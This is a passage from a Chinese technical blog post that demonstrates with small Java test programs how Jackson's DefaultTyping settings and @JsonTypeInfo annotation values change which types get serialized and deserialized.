<p>这是加了JAVA_LANG_OBJECT 的情况下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710488805969-de4776eb-f936-4d03-92a5-a80185b51b0e.png#averageHue=%2340444c&clientId=u20247fd2-a5d8-4&from=paste&height=93&id=uc27e19f7&originHeight=140&originWidth=880&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=50353&status=done&style=none&taskId=u99f32b04-1f0b-4d01-b09e-fcc42df0558&title=&width=586.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>如果不加结果如下：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710488840010-e03fcbcf-5b91-479b-9061-c83ea8ec9f19.png#averageHue=%2342454e&clientId=u20247fd2-a5d8-4&from=paste&height=76&id=u3e1e9839&originHeight=114&originWidth=790&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=40677&status=done&style=none&taskId=uaf2f130a-7012-4696-940f-7722e9935e6&title=&width=526.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>发现我们指定的 hacker 类并没有被序列化，只是序列化了一个 object 类，其自读属性和 hacker 一样</p>
<h5 id="3x02-OBJECT-AND-NON-CONCRETE"><a href="#3x02-OBJECT-AND-NON-CONCRETE" class="headerlink" title="3x02 OBJECT_AND_NON_CONCRETE"></a>3x02 OBJECT_AND_NON_CONCRETE</h5><p> 当类中有Interface AbstractClass类时 对其进行序列化和反序列化 这也是enableDefaultTyping() 的默认选项  </p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JacksonPD</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        person2 person2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">person2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"stoocea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span>object<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">mysex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectMapper</span> objectMapper<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span>
        objectMapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">OBJECT_AND_NON_CONCRETE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> json<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2 person2_1<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span>person2<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person2_1<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果如下，发现接口也被序列化了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710489326925-2bbc5554-7b89-459b-b270-7c09e8a42c4b.png#averageHue=%2341454e&clientId=u20247fd2-a5d8-4&from=paste&height=83&id=u4672fa86&originHeight=124&originWidth=1113&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=61778&status=done&style=none&taskId=u7d1bdad6-7579-47c3-a2d5-8a353a39e43&title=&width=742" referrerpolicy="no-referrer" alt="image.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710489814471-161787a0-2578-467a-9193-67cbf25b9d5a.png#averageHue=%23444750&clientId=u20247fd2-a5d8-4&from=paste&height=99&id=uafe7486c&originHeight=148&originWidth=883&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=66493&status=done&style=none&taskId=u4057355a-e89b-4e71-8689-274c271badd&title=&width=588.6666666666666" referrerpolicy="no-referrer" alt="image.png"></p>
<h5 id="3x03-NON-CONCRETE-AND-ARRAYS"><a href="#3x03-NON-CONCRETE-AND-ARRAYS" class="headerlink" title="3x03 NON_CONCRETE_AND_ARRAYS"></a>3x03 NON_CONCRETE_AND_ARRAYS</h5><p>继续增加作用范围，这次可以序列化 array 数组类型了</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JacksonPD</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        person2 person2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">person2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"stoocea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hacker<span class="token punctuation">[</span><span class="token punctuation">]</span> hackers<span class="token operator">=</span><span class="token keyword">new</span> hacker<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        hackers<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token string">"tea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hackers<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token string">"coffee"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span>object<span class="token operator">=</span>hackers<span class="token punctuation">;</span>
        <span class="token class-name">ObjectMapper</span> objectMapper<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span>
        <span class="token comment">//objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span>
        objectMapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">NON_CONCRETE_AND_ARRAYS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> json<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2 person2_1<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span>person2<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person2_1<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710490295450-854c907a-7153-4cea-a495-834af316c359.png#averageHue=%2342464f&clientId=u20247fd2-a5d8-4&from=paste&height=110&id=u9c3dee77&originHeight=165&originWidth=1313&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=100041&status=done&style=none&taskId=udb8c3311-9b67-4a61-b9b2-0dd8c736b22&title=&width=875.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>这里会稍显不同，我们看到在 hacker 数组类的序列化数据前面有一个 [L 标识，这其实是标识 jackson 在序列化和反序列化的过程中对 array 类型也执行了相同的操作<br>如果不加，也是相同的操作，它会往 object 属性字段塞一个数组进去，并不会真得去反序列化 Hackers 这个具体类型<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710490387589-77d6d31d-d1f5-46c9-918e-f347fc1d7c9f.png#averageHue=%2342464f&clientId=u20247fd2-a5d8-4&from=paste&height=116&id=uf27f8f0f&originHeight=174&originWidth=1121&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=91847&status=done&style=none&taskId=ue6289d89-b73e-4cb3-92d9-2c520534458&title=&width=747.3333333333334" referrerpolicy="no-referrer" alt="image.png"></p>
<h5 id="3x04-NON-FINAL"><a href="#3x04-NON-FINAL" class="headerlink" title="3x04 NON_FINAL"></a>3x04 NON_FINAL</h5><p>这个更是重量级，除了上述三个默认值的范围，它还继续扩大可序列化的范围，直至没有 final 标识的属性字段都能被反序列化<br>这里我们对 person2 类稍作修改<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710490813717-3ee1fe3b-caef-4030-9910-55135f1ac90b.png#averageHue=%233e424b&clientId=u20247fd2-a5d8-4&from=paste&height=264&id=u0d7d3ee7&originHeight=396&originWidth=755&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=154414&status=done&style=none&taskId=uf0701856-1fc8-414b-a0a9-a8566b06bc5&title=&width=503.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>然后测试类继续</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JacksonPD</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        person2 person2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">person2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"stoocea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hacker<span class="token punctuation">[</span><span class="token punctuation">]</span> hackers<span class="token operator">=</span><span class="token keyword">new</span> hacker<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        hackers<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token string">"tea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hackers<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token string">"coffee"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span>object<span class="token operator">=</span>hackers<span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span>hacker<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token string">"npt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectMapper</span> objectMapper<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span>
        <span class="token comment">//objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span>
        <span class="token comment">//objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);</span>
        objectMapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">NON_FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> json<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2 person2_1<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span>person2<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person2_1<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710490846686-55664fc3-f43a-40b9-b452-bec61581b6a5.png#averageHue=%233f444e&clientId=u20247fd2-a5d8-4&from=paste&height=100&id=u8af37f9b&originHeight=150&originWidth=2233&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=175054&status=done&style=none&taskId=u0ac8ad5b-5c84-4539-b741-3c5d01e0d73&title=&width=1488.6666666666667" referrerpolicy="no-referrer" alt="image.png"></p>
<p>综述上面 4 个默认属性对于序列化的范围是逐渐递增的</p>
<table>
<thead>
<tr>
<th>DefaultTyping类型</th>
<th>描述说明</th>
</tr>
</thead>
<tbody><tr>
<td>JAVA_LANG_OBJECT</td>
<td>属性的类型为Object</td>
</tr>
<tr>
<td>OBJECT_AND_NON_CONCRETE</td>
<td>属性的类型为Object、Interface、AbstractClass</td>
</tr>
<tr>
<td>NON_CONCRETE_AND_ARRAYS</td>
<td>属性的类型为Object、Interface、AbstractClass、Array</td>
</tr>
<tr>
<td>NON_FINAL</td>
<td>所有除了声明为final之外的属性</td>
</tr>
</tbody></table>
<h4 id="2x02-JsonTypeInfo注解"><a href="#2x02-JsonTypeInfo注解" class="headerlink" title="2x02 @JsonTypeInfo注解"></a>2x02 <code>@JsonTypeInfo</code>注解</h4><p>一共支持下面 5 种类型的取值</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NONE</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">CLASS</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">MINIMAL_CLASS</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NAME</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">CUSTOM</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>下面逐个看使用案例</p>
<h5 id="3x01-JsonTypeInfo-Id-NONE"><a href="#3x01-JsonTypeInfo-Id-NONE" class="headerlink" title="3x01 JsonTypeInfo.Id.NONE"></a>3x01 JsonTypeInfo.Id.NONE</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710492181782-b88ea2f9-740e-4fd5-ad52-27a5f030b97a.png#averageHue=%233e434c&clientId=u3a678ee7-4c5f-4&from=paste&height=296&id=u3613ed8f&originHeight=444&originWidth=854&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=183273&status=done&style=none&taskId=u743a2fc2-f00b-4f1c-9990-8cb295c4007&title=&width=569.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>先给 person2 类打上注解，然后我们的测试类就不需要通过 objectMapper 亲自去设置属性了</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        person2 person2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">person2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"stoocea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span>hacker<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token string">"duuuu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person2<span class="token punctuation">.</span>object<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">mysex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectMapper</span> objectMapper<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//Person person=new Person("stoocea",20);</span>

        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">String</span> json<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//String json=objectMapper.writeValueAsString(person);</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
            person2 person2_1<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span>person2<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710492289261-2e94a225-48a0-4a6f-bda5-488b88571193.png#averageHue=%23434750&clientId=u3a678ee7-4c5f-4&from=paste&height=112&id=uc70efe88&originHeight=168&originWidth=1338&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=113167&status=done&style=none&taskId=uc70fd651-f39c-4708-8de6-826f83a7a75&title=&width=892" referrerpolicy="no-referrer" alt="image.png"><br>发现好像和加没加注释没有区别，它并没有去序列化具体的类型，这其实也很容易想，它本身注解里面就是 None，那肯定是啥都不会去做的</p>
<h5 id><a href="#" class="headerlink" title></a></h5><h5 id="3x02-JsonTypeInfo-Id-CLASS"><a href="#3x02-JsonTypeInfo-Id-CLASS" class="headerlink" title="3x02 JsonTypeInfo.Id.CLASS"></a>3x02 JsonTypeInfo.Id.CLASS</h5><p>修改 person2 中注解内容为JsonTypeInfo.Id.CLASS，然后再经过一遍测试类<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710492206181-7804e113-bcac-4593-8960-246341022825.png#averageHue=%233e434c&clientId=u3a678ee7-4c5f-4&from=paste&height=338&id=u25f30c30&originHeight=507&originWidth=864&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=223359&status=done&style=none&taskId=uba691bec-fb19-4e30-aae8-a0cf4486c00&title=&width=576" referrerpolicy="no-referrer" alt="image.png"><br>发现这次多了很多东西<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710492261925-26b4da5e-5a18-473f-8385-562ff0f20ef6.png#averageHue=%233e434d&clientId=u3a678ee7-4c5f-4&from=paste&height=154&id=ue57d32c9&originHeight=231&originWidth=1880&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=209780&status=done&style=none&taskId=u3cd2aab0-f6ac-436f-abbd-a9369f7cea2&title=&width=1253.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>首先就是最明显的加了一个<code>@class</code>标识符，然后里面也确实例化了具体类，但是我们还是看到 mysex 的 sex 接口没有被序列化出来，但是该序列化出的类还是</p>
<h5 id="-1"><a href="#-1" class="headerlink" title></a></h5><h5 id="3x03-JsonTypeInfo-Id-NAME"><a href="#3x03-JsonTypeInfo-Id-NAME" class="headerlink" title="3x03 JsonTypeInfo.Id.NAME"></a>3x03 JsonTypeInfo.Id.NAME</h5><p>还是修改 person2 中的注解,然后运行测试类，先看序列化的结果，它包含了<code>@type</code>具体标识了类型，但是没有获取全类名，这也是为什么后续有个报错的原因<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710492611051-be3e874a-80b9-4530-924e-91847d73e729.png#averageHue=%233f444d&clientId=u3a678ee7-4c5f-4&from=paste&height=122&id=u930fd130&originHeight=183&originWidth=2368&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=264187&status=done&style=none&taskId=u5b28779c-1b4c-40b9-8d73-46107fc6338&title=&width=1578.6666666666667" referrerpolicy="no-referrer" alt="image.png"></p>
<h5 id="3x04-JsonTypeInfo-Id-CUSTOM"><a href="#3x04-JsonTypeInfo-Id-CUSTOM" class="headerlink" title="3x04 JsonTypeInfo.Id.CUSTOM"></a>3x04 JsonTypeInfo.Id.CUSTOM</h5><p>这个其实是用来给用户自定义的，我们必须自己手动写一个解析器才行，没办法直接使用</p>
